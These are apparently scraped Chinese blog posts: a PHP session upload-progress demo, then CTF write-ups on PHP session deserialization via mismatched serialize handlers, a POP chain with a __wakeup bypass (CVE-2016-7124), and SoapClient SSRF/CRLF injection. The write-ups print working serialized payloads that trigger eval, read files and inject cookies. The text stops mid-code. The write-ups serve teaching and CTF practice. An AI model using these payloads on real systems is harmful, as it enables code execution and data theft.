123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181&lt;?php session_start(); ?&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;zh-CN&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;PHP(5.4) Session 上传进度 Demo&lt;/title&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;meta name=&quot;keywords&quot; content=&quot;&quot;/&gt; &lt;meta name=&quot;description&quot; content=&quot;&quot;/&gt; &lt;meta name=&quot;author&quot; content=&quot;&quot;&gt; &lt;link href=&quot;https://cdn.bootcss.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;style type=&quot;text/css&quot;&gt; body&#123; font-size:1em; color:#333; font-family: &quot;宋体&quot;, Arial, sans-serif; &#125; h1, h2, h3, h4, h5, h6&#123; font-family: &quot;宋体&quot;, Georgia, serif; color:#000; line-height:1.8em; margin:0; &#125; h1&#123; font-size:1.8em; &#125; #wrap&#123; margin-top:15px; margin-bottom:50px; background:#fff; border-radius:5px; box-shadow:inset 0 0 3px #000, 0 0 3px #eee; &#125; #header&#123; border-radius:5px 5px 0 0; box-shadow:inset 0 0 3px #000; padding:0 15px; color:#fff; background: #333333; &#125; #header h1&#123; color:#fff; &#125; #article&#123; padding:0 15px; &#125; #footer&#123; text-align:center; border-top:1px solid #ccc; border-radius:0 0 5px 5px; &#125; .progress &#123; width: 100%; border: 1px solid #4da8fe; border-radius: 40px; height: 20px; position: relative; &#125; .progress .labels &#123; position: relative; text-align: center; &#125; .progress .bar &#123; position: absolute; left: 0; top: 0; background: #4D90FE; height: 20px; line-height:20px; border-radius: 40px; min-width: 20px; &#125; .report-file &#123; display: block; position: relative; width: 120px; height: 28px; overflow: hidden; border: 1px solid #428bca; background: none repeat scroll 0 0 #428bca; color: #fff; cursor: pointer; text-align: center; float: left; margin-right:5px; &#125; .report-file span &#123; cursor: pointer; display: block; line-height: 28px; &#125; .file-prew &#123; cursor: pointer; position: absolute; top: 0; left:0; width: 120px; height: 30px; font-size: 100px; opacity: 0; filter: alpha(opacity=0); &#125; .container&#123; padding-left:0; padding-right:0; margin:0 auto; &#125; &lt;/style&gt; &lt;/head&gt;&lt;body&gt; &lt;div id=&quot;wrap&quot; class=&quot;container&quot;&gt; &lt;div id=&quot;header&quot;&gt; &lt;h1&gt;Session上传进度 Demo&lt;/h1&gt; &lt;/div&gt; &lt;div id=&quot;article&quot;&gt; &lt;form id=&quot;upload-form&quot; action=&quot;upload.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot; style=&quot;margin:15px 0&quot; target=&quot;hidden_iframe&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;&lt;?php echo ini_get(&quot;session.upload_progress.name&quot;); ?&gt;&quot; value=&quot;test&quot;/&gt; &lt;div class=&quot;report-file&quot;&gt; &lt;span&gt;上传文件…&lt;/span&gt;&lt;input tabindex=&quot;3&quot; size=&quot;3&quot; name=&quot;file1&quot; class=&quot;file-prew&quot; type=&quot;file&quot; onchange=&quot;document.getElementById(&#x27;textName&#x27;).value=this.value&quot;&gt; &lt;/div&gt; &lt;input type=&quot;text&quot; id=&quot;textName&quot; style=&quot;height: 28px;border:1px solid #f1f1f1&quot; /&gt; &lt;p&gt; &lt;input type=&quot;submit&quot; class=&quot;btn btn-default&quot; value=&quot;上传&quot;/&gt; &lt;/p&gt; &lt;/form&gt; &lt;div id=&quot;progress&quot; class=&quot;progress&quot; style=&quot;margin-bottom:15px;display:none;&quot;&gt; &lt;div class=&quot;bar&quot; style=&quot;width:0%;&quot;&gt;&lt;/div&gt; &lt;div class=&quot;labels&quot;&gt;0%&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;!-- #article --&gt; &lt;div id=&quot;footer&quot;&gt; &lt;p&gt; &lt;/p&gt; &lt;/div&gt;&lt;/div&gt;&lt;!-- #wrap --&gt; &lt;iframe id=&quot;hidden_iframe&quot; name=&quot;hidden_iframe&quot; src=&quot;about:blank&quot; style=&quot;display:none;&quot;&gt;&lt;/iframe&gt; &lt;script src=&quot;https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;&gt; function fetch_progress() &#123; $.get(&#x27;progress.php&#x27;, &#123;&#x27;&lt;?php echo ini_get(&quot;session.upload_progress.name&quot;); ?&gt;&#x27;: &#x27;test&#x27;&#125;, function (data) &#123; var progress = parseInt(data); $(&#x27;#progress .labels&#x27;).html(progress + &#x27;%&#x27;); $(&#x27;#progress .bar&#x27;).css(&#x27;width&#x27;, progress + &#x27;%&#x27;); if (progress &lt; 100) &#123; setTimeout(&#x27;fetch_progress()&#x27;, 500); &#125; else &#123; $(&#x27;#progress .labels&#x27;).html(&#x27;100%&#x27;); &#125; &#125;, &#x27;html&#x27;); &#125; $(&#x27;#upload-form&#x27;).submit(function () &#123; $(&#x27;#progress&#x27;).show(); //图片比较小，看不出进度条加载效果，初始设33% $(&#x27;#progress .labels&#x27;).html(&#x27;33%&#x27;); $(&#x27;#progress .bar&#x27;).css(&#x27;width&#x27;, &#x27;33%&#x27;); setTimeout(&#x27;fetch_progress()&#x27;, 500); &#125;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 注意表单中的session.upload_progress.name隐藏项，值设置为了test。表单中仅有一个文件上传input，如果需要，你可以添加多个。 这里需要特别注意一下表单的target属性，这里设置指向了一个当前页面中的iframe。这一点很关键，通过设置target属性，让表单提交后的页面显示在iframe中，从而避免当前的页面跳转。因为我们还得在当前页面显示进度条呢。 上传文件upload.php 1234567891011&lt;?php/** * 上传文件 */if(is_uploaded_file($_FILES[&#x27;file1&#x27;][&#x27;tmp_name&#x27;]))&#123; //unlink($_FILES[&#x27;file1&#x27;][&#x27;tmp_name&#x27;]); $fileName = &#x27;pic_&#x27; . date(&#x27;YmdHis&#x27;) . mt_rand(10000,99999); $ext = substr($_FILES[&#x27;file1&#x27;][&#x27;name&#x27;], strrpos($_FILES[&#x27;file1&#x27;][&#x27;name&#x27;], &#x27;.&#x27;)); move_uploaded_file($_FILES[&#x27;file1&#x27;][&#x27;tmp_name&#x27;], $fileName . $ext);&#125; ajax获取上传进度progress.php 12345678910111213141516171819&lt;?php/** * AJAX获取上传文件进度 */session_start(); $i = ini_get(&#x27;session.upload_progress.name&#x27;);//session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot; $key = ini_get(&quot;session.upload_progress.prefix&quot;) . $_GET[$i];//session.upload_progress.prefix = &quot;upload_progress_&quot; . &#x27;test&#x27; if (!empty($_SESSION[$key])) &#123; $current = $_SESSION[$key][&quot;bytes_processed&quot;]; // 已收到的数据长度 $total = $_SESSION[$key][&quot;content_length&quot;]; // POST请求的总数据长度 echo $current &lt; $total ? ceil($current / $total * 100) : 100;&#125;else&#123; echo 100;&#125; 注意事项: 1.input标签的位置name为session.upload_progress.name的input标签一定要放在文件input &lt;input type=&quot;file&quot; /&gt; 的前面。 2.通过设置 $_SESSION[$key]['cancel_upload'] = true 可取消当次上传。但仅能取消正在上传的文件和尚未开始的文件。已经上传成功的文件不会被删除。 3.应该通过 setTimeout() 来调用 fetch_progress()，这样可以确保一次请求返回之后才开始下一次请求。如果使用 setInterval() 则不能保证这一点，有可能导致进度条出现’不进反退’"},{"title":"PHP-session反序列化","date":"2020-04-25","updated":"2024-03-19","path":"2020/04/25/PHP-session反序列化/","text":"当浏览器向服务器端上传一个文件时，PHP将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中。然后，随着上传的进行，周期性的更新session中的信息。这样，浏览器端就可以使用Ajax周期性的请求一个服务器端脚本，由该脚本返回session中的进度信息；浏览器端的Javascript即可根据这些信息显示/更新进度条了。 php.ini需配置以下选项 123456session.upload_progress.enabled = &quot;1&quot;session.upload_progress.cleanup = &quot;1&quot;session.upload_progress.prefix = &quot;upload_progress_&quot;session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;session.upload_progress.freq = &quot;1%&quot;session.upload_progress.min_freq = &quot;1&quot; 其中enabled控制upload_progress功能的开启与否，默认开启； cleanup 则设置当文件上传的请求提交完成后，是否清除session的相关信息，默认开启，如果需要调试$_SESSION，则应该设为Off。 prefix 和 name 两项用来设置进度信息在session中存储的变量名/键名。 freq 和 min_freq 两项用来设置服务器端对进度信息的更新频率。合理的设置这两项可以减轻服务器的负担。 在上传文件的表单中，需要为该次上传设置一个标识符，并在接下来的过程中使用该标识符来引用进度信息。 在上传文件的表单中，需要为该次上传设置一个标识符，并在接下来的过程中使用该标识符来引用进度信息。 具体的，在上传表单中需要有一个隐藏的input，它的name属性为php.ini中 session.upload_progress.name 的值；它的值为一个由你自己定义的标识符。如下： 代码如下: 1`&lt;``input` `type=&quot;hidden&quot; name=&quot;&quot; value=&quot;test&quot; /&gt;` 接到文件上传的表单后，PHP会在$_SESSION变量中新建键，键名是一个将session.upload_progress.prefix的值与上面自定义的标识符连接后得到的字符串，可以这样得到： 代码如下: 123$name = ini_get(&#x27;session.upload_progress.name&#x27;);$key = ini_get(&#x27;session.upload_progress.prefix&#x27;) . $_POST[$name];$_SESSION[$key]; // 这里就是此次文件上传的进度信息了 SESSION[_SESSION[S​ESSION[key]这个变量的结构是这样的： 12345678910111213141516171819array ( &#x27;upload_progress_test&#x27; =&gt; array ( &#x27;start_time&#x27; =&gt; 1491494993, // 开始时间 &#x27;content_length&#x27; =&gt; 1410397, // POST请求的总数据长度 &#x27;bytes_processed&#x27; =&gt; 1410397, // 已收到的数据长度 &#x27;done&#x27; =&gt; true, // 请求是否完成 true表示完成，false未完成 &#x27;files&#x27; =&gt; array ( 0 =&gt; array ( &#x27;field_name&#x27; =&gt; &#x27;file1&#x27;, &#x27;name&#x27; =&gt; &#x27;test.jpg&#x27;, &#x27;tmp_name&#x27; =&gt; &#x27;D:\\\\wamp\\\\tmp\\\\phpE181.tmp&#x27;, &#x27;error&#x27; =&gt; 0, &#x27;done&#x27; =&gt; true, &#x27;start_time&#x27; =&gt; 1491494993, &#x27;bytes_processed&#x27; =&gt; 1410096, ), ), ),); 这样，我们就可以使用其中的 content_length 和 bytes_processed 两项来得到进度百分比。 关于session的存储，java是将用户的session存入内存中，而php则是将session以文件的形式存储在服务器某个tmp文件中，可以在php.ini里面设置session.save_path存储的位置 设置序列化规则则是 注意，php_serialize在5.5版本后新加的一种规则，5.4及之前版本，如果设置成php_serialize会报错 12session.serialize_handler = php 一直都在 它是用 |分割session.serialize_handler = php_serialize 5.5之后启用 它是用serialize反序列化格式分割 首先看session.serialize_handler = php序列化的结果 它的规则是$_SESSION是个数组，数组中的键和值中间用 |来分割，值如果是数组或对象按照序列化的格式存储 然后看看session.serialize_handler = php_serialize的序列化结果 它是全程按照serialize的格式序列化了$_SESSION这个数组 它比php的格式多了个最前面多了个 “a:2:&#123; ....” 也就是$_SESSION这个数组有2个元素，还有个区别在于，它的键名也表明了长度和属性，中间用 ; 来隔开键值对 虽然2个序列化格式本身没有问题，但是如果2个混合起用就会造成危害 形成原理是在用session.serialize_handler = php_serialize存储的字符可以引入 | , 再用session.serialize_handler = php格式取出$_SESSION的值时 &quot;|&quot;会被当成键值对的分隔符 比如，我先用php存了个数组，在$_SESSION[‘b’]的值里面加入 | ,并在之后写成一个数组的序列化格式 如果正常的用php_serialize解析,它返回的是$_SESSION[‘b’]是个长度为44的字符串 如果用php进行解析，发现它理解为一个很长的名字的值是一个带了2个元素的数组 0x01一道CTF题目： 题目是道网上常常拿来做例子的一道php反序列化题目 题目连接：http://web.jarvisoj.com:32784/ 源码已经给出，如下 1234567891011121314151617181920212223242526&lt;?php//A webshell is wait for youini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);session_start();class OowoO&#123; public $mdzz; function __construct() &#123; $this-&gt;mdzz = &#x27;phpinfo();&#x27;; &#125; function __destruct() &#123; eval($this-&gt;mdzz); &#125;&#125;if(isset($_GET[&#x27;phpinfo&#x27;]))&#123; $m = new OowoO();&#125;else&#123; highlight_string(file_get_contents(&#x27;index.php&#x27;));&#125;?&gt; 能够查看phpinfo,于是发现全局用的php_serialize进行序列化，而这个页面是以php来进行解析的 那么可以利用上面的理论进行事先准备个$this-&gt;mdzz= ‘payload’ 进行攻击 问题是怎么将payload写入session,这里php有个上传文件的会将文件名写入session的技巧 https://bugs.php.net/bug.php?id=71101 原文意思大致要求满足以下2个条件就会写入到session中 1session.upload_progress.enabled = On上传一个字段的属性名和session.upload_progress.name的值相，这里根据上面的phpinfo信息看得出，值为PHP_SESSION_UPLOAD_PROGRESS,即name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; 写好脚本 12345678910111213&lt;html&gt;&lt;head&gt; &lt;title&gt;upload&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;1&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; /&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 注意这里 “PHP_SESSION_UPLOAD_PROGRESS” 的 value不能为空 这里根据题目的类，需要修改mdzz这个属性，于是写个php生成payload,因为看看phpinfo的禁用函数，能调用系统的函数都被ban了，于是只能用var_dump,scandir和file_get_contents来读取flag 12345678910111213&lt;?phpclass OowoO&#123; public $mdzz = &quot;var_dump(scandir(&#x27;./&#x27;));&quot;; function __destruct() &#123; eval($this-&gt;mdzz); &#125;&#125;$a = new OowoO();echo serialize($a) . &quot;&lt;br&gt;&quot;;?&gt; 生成payload 1O:5:&quot;OowoO&quot;:1:&#123;s:4:&quot;mdzz&quot;;s:24:&quot;var_dump(scandir(&#x27;./&#x27;));&quot;;&#125;当然这个是不行的，我们要稍微改一下，&quot;要转义，前面加个||O:5:\\&quot;OowoO\\&quot;:1:&#123;s:4:\\&quot;mdzz\\&quot;;s:24:\\&quot;var_dump(scandir(&#x27;./&#x27;));\\&quot;;&#125; 先随便传个文件，把包抓下来，把文件名改成我们的payload 能够查看到根目录的情况了 网上有个payload是直接用 1|O:5:\\&quot;OowoO\\&quot;:1:&#123;s:4:\\&quot;mdzz\\&quot;;s:36:\\&quot;print_r(scandir(dirname(__FILE__)));\\&quot;;&#125; 我因为太菜最先没想到，于是去看了下phpinfo的session的存放位置，有个/opt/lampp/估计是装的的xampp这个集成的环境，而这个集成环境的web页面放在htdocs目录下的 1|O:5:\\&quot;OowoO\\&quot;:1:&#123;s:4:\\&quot;mdzz\\&quot;;s:38:\\&quot;var_dump(scandir(&#x27;/opt/lampp/&#x27;));\\&quot;;&#125;|O:5:\\&quot;OowoO\\&quot;:1:&#123;s:4:\\&quot;mdzz\\&quot;;s:40:\\&quot;var_dump(scandir(&#x27;/opt/lampp/htdocs/&#x27;));\\&quot;;&#125; 看到flag文件了 接下来是读取，这里额外提一句file_put_contents和fie_get_contents能够使用php://filter伪协议，但这里用var_dump导出来，不是文件包含，看下源码就能找打答案 1|O:5:\\&quot;OowoO\\&quot;:1:&#123;s:4:\\&quot;mdzz\\&quot;;s:89:\\&quot;var_dump(file_get_contents(&#x27;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&#x27;));\\&quot;;&#125; 0x03环境复现： 因为最先学习这道题的时候想看看session文件，于是在本地搭建了个环境 123456789101112131415&lt;?phpini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);session_start();var_dump($_SESSION);echo &quot;&lt;br&gt;&quot;;class test&#123; public $wd; function __destruct() &#123; eval($this-&gt;wd); &#125;&#125;?&gt; 最先我用一个文件直接生产用php_serialize规则序列化并直接存在session中 然后访问模拟搭建的页面,漏洞能够利用成功 于是我改用文件上传的形式，结果死活没法生成正确的session 再看看session文件，啥都没写入 这是为什么，想了一晚上，看了看phpinfo的信息，上传保留session的enabled是默认开启的，session.upload_progress.name也是默认 上传的html页面能在上面的ctf题中成功运行，说明不是上传的请求头格式问题 payload如果写入session文件中也能正常触发phpinfo 但是现在的问题是session写不进去，于是估计是配置问题了。 我再读了遍：https://bugs.php.net/bug.php?id=71101 发现它给出它的运行环境的配置，于是我按照它的ini对应的配置，再配了遍自己的php.ini，发现很多配置都是被注释掉的，也就是默认的值 最后成功执行了 session文件也写入了，可以仔细看看写的session文件内容 因为用php解析了，为了使解析格式正确，它直接丢掉了些 }，如果正常解析的话，可以看出多了很多键值对，但是正是因为用php解析， |前面的所有字符都当做键名，而后面的payload则被反序列化，造成漏洞利用 再回到为什么之前不行，现在可以运行的问题上，最后我测试了是 session.upload_progress.cleanup这个参数 1session.upload_progress.cleanup = Off 这个要为Off或者0,才能将上传的内容保存到session,但是，php默认的是On，所有最先死活传不上去 用xampp组件安装中，上述的配置项的设置如下： 1234session.save_path=&quot;D:\\xampp\\tmp&quot; 表明所有的session文件都是存储在xampp/tmp下session.save_handler=files 表明session是以文件的方式来进行存储的session.auto_start=0 表明默认不启动sessionsession.serialize_handler=php 表明session的默认序列话引擎使用的是php序列话引擎 在上述的配置中，session.serialize_handler是用来设置session的序列话引擎的，除了默认的PHP引擎之外，还存在其他引擎，不同的引擎所对应的session的存储方式不相同。 php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值 php:存储方式是，键名+竖线+经过serialize()函数序列处理的值 php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值 在PHP中默认使用的是PHP引擎，如果要修改为其他的引擎，只需要添加代码ini_set(‘session.serialize_handler’, ‘需要设置的引擎’);。示例代码如下： session 的目录在 /var/lib/php/sessions 中 12345&lt;?phpini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);session_start();$_SESSION[&#x27;name&#x27;] = &#x27;spoock&#x27;;var_dump($_SESSION); 在 php_serialize 引擎下，session文件中存储的数据为: a:1:&#123;s:4:&quot;name&quot;;s:6:&quot;spoock&quot;;&#125; php 引擎下文件内容为: name|s:6:&quot;spoock&quot;; php_binary 引擎下文件内容为: names:6:&quot;spoock&quot;; 由于name的长度是4，4在ASCII表中对应的就是EOT。根据php_binary的存储规则，最后就是names:6:“spoock”;。(突然发现ASCII的值为4的字符无法在网页上面显示，这个大家自行去查ASCII表吧) PHP Session中的序列化危害 PHP中的Session的实现是没有的问题，危害主要是由于程序员的Session使用不当而引起的。 如果在PHP在反序列化存储的$_SESSION数据时使用的引擎和序列化使用的引擎不一样，会导致数据无法正确第反序列化。通过精心构造的数据包，就可以绕过程序的验证或者是执行一些系统的方法。例如: 1$_SESSION[&#x27;ryat&#x27;] = &#x27;|O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;s:2:&quot;xx&quot;;&#125;&#x27;; php文件如: 1234&lt;?phpini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);session_start();$_SESSION[&#x27;ryat&#x27;] = &#x27;|O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;s:2:&quot;xx&quot;;&#125;&#x27;; 访问后得到session文件中的内容如下： 12root/var/lib/php/sessions cat sess_e07gghbkcm0etit02bkjlbhac6 a:1:&#123;s:4:&quot;ryat&quot;;s:30:&quot;|O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;s:2:&quot;xx&quot;;&#125; 但此时模拟在其他页面使用不同的php引擎来读取时的内容如下：(默认使用php引擎读取session文件) 1234567891011&lt;?php#ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);session_start();#$_SESSION[&#x27;ryat&#x27;] = &#x27;|O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;s:2:&quot;xx&quot;;&#125;&#x27;;class A &#123; public $a = &#x27;aa&#x27;; function __wakeup() &#123; echo $this-&gt;a; &#125;&#125;// var_dump($_SESSION); 访问该页面输出xx 1234567xxarray(1) &#123; [&quot;a:1:&#123;s:4:&quot;ryat&quot;;s:30:&quot;&quot;]=&gt; object(A)#1 (1) &#123; [&quot;a&quot;]=&gt; string(2) &quot;xx&quot; &#125;&#125; 这是因为当使用php引擎的时候，php引擎会以|作为作为key和value的分隔符，那么就会将 a:1:{s:4:“ryat”;s:30:&quot; 作为SESSION的key，将 O:1:“A”:1:{s:1:“a”;s:2:“xx”;} 作为value，然后进行反序列化，最后就会得到A这个类。 这种由于序列话化和反序列化所使用的不一样的引擎就是造成PHP Session序列话漏洞的原因。漏洞在加载使用php引擎的页面时session去读session中的内容并反序列化导致漏洞触发，不需要任何输出 GCTF上的一道session反序列化漏洞分析: index.php中内容为: 123456789101112131415161718&lt;?php//error_reporting(E_ERROR &amp; ~E_NOTICE);ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);header(&quot;content-type;text/html;charset=utf-8&quot;);session_start();if(isset($_GET[&#x27;src&#x27;]))&#123; $_SESSION[&#x27;src&#x27;] = $_GET[&#x27;src&#x27;]; highlight_file(__FILE__); print_r($_SESSION[&#x27;src&#x27;]);&#125;?&gt;&lt;!DOCTYPE HTML&gt;&lt;html&gt; &lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; &lt;title&gt;代码审计2&lt;/title&gt; &lt;/head&gt; &lt;body&gt; 1234567&lt;form action=&quot;./query.php&quot; method=&quot;POST&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;ticket&quot; /&gt; &lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;a href=&quot;./?src=1&quot;&gt;查看源码&lt;/a&gt;&lt;/body&gt;&lt;/html&gt; query.php 中的内容为: 123456789101112131415161718192021222324252627282930313233343536373839404142434445/************************///query.php 部分代码session_start();header(&#x27;Look me: edit by vim ~0~&#x27;)//......class TOPA&#123; public $token; public $ticket; public $username; public $password; function login()&#123; //if($this-&gt;username == $USERNAME &amp;&amp; $this-&gt;password == $PASSWORD)&#123; //抱歉 $this-&gt;username ==&#x27;aaaaaaaaaaaaaaaaa&#x27; &amp;&amp; $this-&gt;password == &#x27;bbbbbbbbbbbbbbbbbb&#x27;)&#123; return &#x27;key is:&#123;&#x27;.$this-&gt;token.&#x27;&#125;&#x27;; &#125; &#125;&#125;class TOPB&#123; public $obj; public $attr; function __construct()&#123; $this-&gt;attr = null; $this-&gt;obj = null; &#125; function __toString()&#123; $this-&gt;obj = unserialize($this-&gt;attr); $this-&gt;obj-&gt;token = $FLAG; if($this-&gt;obj-&gt;token === $this-&gt;obj-&gt;ticket)&#123; return (string)$this-&gt;obj; &#125; &#125;&#125;class TOPC&#123; public $obj; public $attr; function __wakeup()&#123; $this-&gt;attr = null; $this-&gt;obj = null; &#125; function __destruct()&#123; echo $this-&gt;attr; &#125;&#125; 思路如下: 这题中我们构造一个TOPC，在析构的时候则会调用echo $this-&gt;attr;； 将attr赋值为TOPB对象，在echo TOPB的时候会自动调用__tostring魔术方法 在__tostring中会调用unserialize($this-&gt;attr),因为后面用到token和ticket，所以显然时TOPA对象。后面判断需要$this-&gt;obj-&gt;token === $this-&gt;obj-&gt;ticket,所以在序列化的时候进行指针引用使$a-&gt;ticket = &amp;$a-&gt;token;，即可绕过判断。 至于为什么(string)$this-&gt;obj会输出flag，后台写的login可能是__tostring吧。 其中反序列化字符串中会有一个__wakeup()函数清空里面的参数，我问可以通过一个cve来绕过：CVE-2016-7124。将Object中表示数量的字段改成比实际字段大的值即可绕过wakeup函数。 最后的代码为: 1234567891011$testa = new TOPA();$testc = new TOPC();$testb = new TOPB();$testa-&gt;username = 0;$testa-&gt;password = 0;$testa-&gt;ticket = &amp;$testa-&gt;token;$sa = serialize($testa);$testc-&gt;attr = $testb;$testb-&gt;attr = $sa;$test = serialize($testc);echo $test; 最终payload为: 1|O:4:&quot;TOPC&quot;:3:&#123;s:3:&quot;obj&quot;;N;s:4:&quot;attr&quot;;O:4:&quot;TOPB&quot;:2:&#123;s:3:&quot;obj&quot;;N;s:4:&quot;attr&quot;;s:84:&quot;O:4:&quot;TOPA&quot;:4:&#123;s:5:&quot;token&quot;;N;s:6:&quot;ticket&quot;;R:2;s:8:&quot;username&quot;;i:0;s:8:&quot;password&quot;;i:0;&#125;&quot;;&#125;&#125;"},{"title":"lctf2018","date":"2020-04-25","updated":"2024-03-19","path":"2020/04/25/lctf2018/","text":"bestphp’s revenge https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label1_0 session反序列化-&gt;soap(ssrf+crlf)-&gt;call_user_func激活soap类 有关session触发反序列化的资料 有关soapclient扩展反序列化的资料 index.php 123456789101112&lt;?php highlight_file(__FILE__);$b = &#x27;implode&#x27;;call_user_func($_GET[f],$_POST);session_start();if(isset($_GET[name]))&#123; $_SESSION[name] = $_GET[name];&#125;var_dump($_SESSION);$a = array(reset($_SESSION),&#x27;welcome_to_the_lctf2018&#x27;);call_user_func($b,$a);?&gt; Flag.php 1234567session_start();echo &#x27;only localhost can get flag!&#x27;;$flag = &#x27;LCTF&#123;*************************&#125;&#x27;;if($_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;)&#123; $_SESSION[&#x27;flag&#x27;] = $flag; &#125;only localhost can get flag! 官方Hint:反序列化 在call_user_func的第二个参数传入了一个$_POST数组 直接传数组的函数确实想不起来几个，更别提什么危险函数了. 通过反序列化+SSRF才能解决的题目，解决的思路就是Session处理器差异化反序列化+SOAP类CRLF/SSRF。 PHP Session 处理器的安全问题 PHP Session数组对象是通过序列化进行存储在文件中，序列化及反序列化处理器设置如果不同会导致安全问题。 PHP 内置了多种处理器用于 $_SESSION 数据时会对数据进行序列化和反序列化，常用的有以下三种，对应三种不同的处理格式： 处理器 对应的存储格式 php 键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值 php_binary 键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值 php_serialize (php&gt;=5.5.4) 经过 serialize() 函数反序列处理的数组 PHP 通过 session.serialize_handler 配置选项设置序列化及反序列化时使用的处理器，默认情况下的处理器为php。 如果我们使用php_serialize作为序列化$_SESSION的处理器，同时$_SESSION注入恶意的代码，但使用php处理器进行反序列化，，就会出现解析问题，造成对象注入。 例如当一开始是以php_serialize方式存储之后，在字符串中间添加了一个| 第二次以php方式进行反序列化，只要控制|后面的字符传为一个反序列化字符串，就会自动进行反序列化 虽然最后会有一个不可控的&quot;;&#125;结尾字符，但是亲测反序列化字符后面可以添加一些脏字符，但是前面不行 1.php 12345678910&lt;?phpecho ini_get(&#x27;session.serialize_handler&#x27;) . &#x27;&lt;br&gt;&#x27;;session_start(array(&#x27;serialize_handler&#x27; =&gt; &#x27;php_serialize&#x27;));echo ini_get(&#x27;session.serialize_handler&#x27;) . &#x27;&lt;br&gt;&#x27;;$target = &#x27;http://127.0.0.1/flag.php&#x27;;$b = new SoapClient(null, array(&#x27;location&#x27; =&gt; $target, &#x27;user_agent&#x27; =&gt; &quot;Rai4over\\r\\n&quot; . &quot;Cookie: PHPSESSID=0e00ae842d955478fa7aef8af5392691&quot;, &#x27;uri&#x27; =&gt; &quot;http://127.0.0.1/&quot;));$_SESSION[&#x27;test&#x27;] = &#x27;|&#x27; . serialize($b);var_dump($_SESSION); 修改处理器，并使用php_serialize进行序列化，为$_SESSION注入|，此时$_SESSION中的变量为字符串 2.php 123&lt;?phpsession_start();var_dump($_SESSION); 使用php进行反序列化，此时存储的内容变为对象，造成对象注入。 SOAP类SSRF/CRLF注入 因为题目代码过于简单，没有可以利用的自定义类，因此只能选择php自带的类库，也就是soapclient https://xz.aliyun.com/t/2148#toc-0 https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label1_0 原生类解决了很多找不到类的情况的麻烦，但是利用Soap进行SSRF也有两个需要注意的点 Soap不是默认开启的，需要手动开启 需要触发__call方法才能进行SSRF soapclient的实例在访问不存在的方法时，会调用__call方法，该方法如果参数可控就能SSRF，同时其中的user_agent还可以造成CRLF注入。 123456&lt;?php$target = &#x27;http://127.0.0.1:2222&#x27;;$b = new SoapClient(null, array(&#x27;location&#x27; =&gt; $target, &#x27;user_agent&#x27; =&gt; &quot;Rai4over\\r\\n&quot; . &quot;Cookie: PHPSESSID=Rai4over&quot;, &#x27;uri&#x27; =&gt; &quot;http://127.0.0.1/&quot;));$b-&gt;test(); SSRF&amp;&amp;CRLF注入Cookie ¶call_user_func执行类方法 执行类方法 123456789class myclass&#123; static function say_hello() &#123; echo &quot;Hello!\\n&quot;; &#125;&#125;$classname = &quot;myclass&quot;;call_user_func(array($classname, &#x27;say_hello&#x27;)); 解决 首先通过第一个call_user_func首先设置session处理器，然后注入soapclient的恶意代包含码。 然后然后反序列化造成$_SESSION对象注入，再通过第一个call_user_func实现对$b的变量覆盖，覆盖为call_user_func，控制第二个call_user_func，触发soapclient的welcome_to_the_lctf2018方法，因为不存在因此触发soapclient的SSRF，需要注入PHPSESSID不然无法将Flag返回当前会话中。 题解 查看session_start的官方文档就可以看到，允许其中传入一个数组，来设置session.的一些参数 这样，我们就可以利用call_user_func($_GET[f],$_POST);来设置session.serialize_handler的值，从而进行Soap的反序列化 12345678&lt;?php$a = new SoapClient(null, array( &#x27;location&#x27; =&gt; &quot;http://127.0.0.1/flag.php&quot;, 